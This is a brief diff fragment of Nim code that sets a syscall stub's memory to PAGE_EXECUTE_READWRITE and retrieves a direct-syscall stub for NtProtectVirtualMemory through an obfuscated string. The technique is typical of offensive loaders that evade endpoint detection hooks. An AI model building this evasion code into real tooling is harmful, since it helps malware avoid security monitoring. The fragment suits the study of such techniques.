+    success = MyVirtualProtect(cast[LPVOID](syscallStub_NtAlloc), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection)
     
     
     success = GetSyscallStub(obf("NtProtectVirtualMemory"), cast[LPVOID](syscallStub_NtProtect))
